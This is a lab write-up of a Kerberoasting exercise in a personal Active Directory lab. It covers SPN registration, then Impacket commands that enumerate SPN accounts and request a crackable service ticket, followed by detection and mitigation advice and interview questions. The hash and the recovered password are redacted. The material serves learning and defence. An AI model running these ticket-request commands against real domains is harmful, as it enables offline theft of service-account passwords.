# Kerberoasting — Active Directory Security Lab

## 1. Objective

The objective of this lab was to understand how Kerberoasting works in an Active Directory environment, identify an account with a Service Principal Name (SPN), request a Kerberos service ticket, and perform an offline password-strength audit.

This exercise was performed in my isolated, self-managed lab domain, `harish.local`.

## 2. Lab Environment

| Component | Details |
|---|---|
| Domain | `harish.local` |
| Domain Controller | DC01 |
| Domain Controller IP | `192.168.182.10` |
| Attacker machine | Kali Linux |
| Domain user | `harish` |
| Test service account | `svc_sql` |
| Registered SPN | `MSSQLSvc/sql01.harish.local:1433` |
| Tool | Impacket GetUserSPNs |

**Lab note:** The SPN was registered for demonstration. The existence of a running SQL Server at `sql01.harish.local` was not independently verified.

## 3. What Is Kerberoasting?

Kerberoasting is an Active Directory attack technique in which an authenticated domain user requests a Kerberos service ticket for an account associated with a Service Principal Name.

The ticket contains encrypted data associated with the service account's credentials. An attacker can attempt to guess the account password offline using password candidates.

The risk is greater when service accounts use weak, reused, or predictable passwords.

## 4. How It Works

1. A domain user authenticates to Active Directory.
2. The user enumerates accounts with registered SPNs.
3. A service ticket (TGS) is requested for a target SPN.
4. The ticket is saved in a format supported by password-auditing tools.
5. The captured material is tested offline against candidate passwords.
6. If a candidate matches, the corresponding password may be recovered.

The offline stage does not require repeatedly authenticating against the Domain Controller.

## 5. Lab Procedure

### Step 1 — Create the test account

Created a dedicated lab account named `svc_sql`.

The account was intended for this exercise and was not created as a Domain Administrator.

### Step 2 — Register an SPN

On DC01, registered the following SPN:

```powershell
setspn -S MSSQLSvc/sql01.harish.local:1433 HARISH\svc_sql
```

### Step 3 — Verify the SPN

```powershell
setspn -L HARISH\svc_sql
```

The registered SPN was displayed as:

```text
MSSQLSvc/sql01.harish.local:1433
```

Also verified the account properties:

```powershell
Get-ADUser -Identity "svc_sql" -Properties ServicePrincipalName, Enabled |
    Select-Object SamAccountName, Enabled, ServicePrincipalName
```

The output showed that `svc_sql` was enabled and had the registered SPN.

### Step 4 — Configure Kerberos on Kali Linux

Configured the Kerberos realm for `HARISH.LOCAL` and the KDC address `192.168.182.10`.

Authenticated as the lab user:

```bash
kinit harish@HARISH.LOCAL
```

Verified the ticket cache:

```bash
klist
```

The cache showed a TGT for `harish@HARISH.LOCAL`.

### Step 5 — Enumerate SPN accounts

```bash
export KRB5CCNAME=/tmp/krb5cc_0

impacket-GetUserSPNs -k -no-pass \
  -dc-ip 192.168.182.10 \
  harish.local/harish
```

The output listed `svc_sql` and its registered SPN.

### Step 6 — Request the service ticket

```bash
impacket-GetUserSPNs -k -no-pass \
  -dc-ip 192.168.182.10 \
  -request-user svc_sql \
  harish.local/harish
```

**Observed result:** Impacket successfully returned a Kerberos service-ticket hash in `$krb5tgs$23$` format for `svc_sql`.

The full hash was saved locally for the offline audit and is intentionally excluded from this documentation.

### Step 7 — Offline password audit

Used the captured ticket in a local offline password-strength audit.

**Result:** The offline audit was completed in the lab. The raw ticket hash and recovered password are intentionally not included in this repository.

## 6. Findings

- The `svc_sql` account had an SPN registered in Active Directory.
- The authenticated lab user could enumerate the SPN.
- Impacket successfully requested and captured the associated service ticket.
- The captured ticket was suitable for offline password auditing.
- A registered SPN alone does not establish that the corresponding service host is running.

## 7. Security Impact

If a service account uses a weak password, offline guessing may recover it. Depending on the account's permissions, a compromised service account could provide access to sensitive systems, data, or services.

The impact depends on the account's privileges, password strength, and where the credentials are used.

## 8. Detection

Administrators can investigate:

- Windows Security Event ID **4769** for Kerberos service-ticket requests.
- Unusual service-ticket request patterns or unexpected SPN targets.
- Requests from accounts or hosts that do not normally access a service.
- Service accounts with excessive privileges or weak password practices.

Event 4769 is generated during legitimate activity too, so it should be correlated with normal environment behaviour rather than treated as proof of an attack.

## 9. Mitigation

- Use long, unique, randomly generated service-account passwords.
- Prefer Group Managed Service Accounts (gMSAs) where supported.
- Apply least privilege to service accounts.
- Review SPNs regularly and remove stale registrations after confirming they are no longer needed.
- Monitor unusual Kerberos service-ticket activity.
- Avoid password reuse across service accounts.
- Rotate credentials according to the organisation's security policy and incident-response requirements.

## 10. Kerberoasting vs AS-REP Roasting

| Feature | Kerberoasting | AS-REP Roasting |
|---|---|---|
| Main target | Account associated with an SPN | Account configured without Kerberos pre-authentication |
| Authentication context | Requires a valid domain identity to request a service ticket | Can expose roastable material without normal pre-authentication for the target account |
| Ticket/material | TGS service-ticket material | AS-REP response material |
| Main weakness tested | Weak service-account password | Weak password on a pre-authentication-disabled account |
| Key mitigation | Strong service-account credentials and least privilege | Require Kerberos pre-authentication and use strong credentials |

## 11. Interview Questions

**Q1. What is Kerberoasting?**

Kerberoasting is an Active Directory technique that requests service tickets for SPN-associated accounts and tests the captured ticket material offline for weak passwords.

**Q2. What is an SPN?**

A Service Principal Name uniquely identifies a service instance for Kerberos authentication and associates it with the account under which the service runs.

**Q3. Does Kerberoasting require Domain Administrator privileges?**

No. A normal authenticated domain user can generally request service tickets for SPN-associated accounts. The ability to request a ticket does not automatically grant access to the service.

**Q4. Why is offline password guessing useful to an attacker?**

It allows password candidates to be tested against captured ticket material without sending each guess to the Domain Controller.

**Q5. How can an organisation reduce Kerberoasting risk?**

Use strong service-account passwords, gMSAs where suitable, least privilege, SPN hygiene, and monitoring for unusual service-ticket requests.

## 12. Evidence

Recommended screenshots:

1. SPN registration command and confirmation.
2. `setspn -L HARISH\svc_sql` output.
3. `Get-ADUser` output showing the test account and SPN.
4. `klist` output showing the lab TGT.
5. SPN enumeration output with `svc_sql`.
6. Ticket-capture output with the actual hash redacted.
7. Offline audit result with any recovered password redacted.

## 13. Conclusion

This lab demonstrated SPN enumeration, Kerberos service-ticket retrieval, and offline password-strength auditing in a controlled Active Directory environment. It also highlighted why service accounts should use strong credentials and minimum necessary privileges.

The test SPN was registered for demonstration; a running SQL Server at the referenced hostname was not verified.
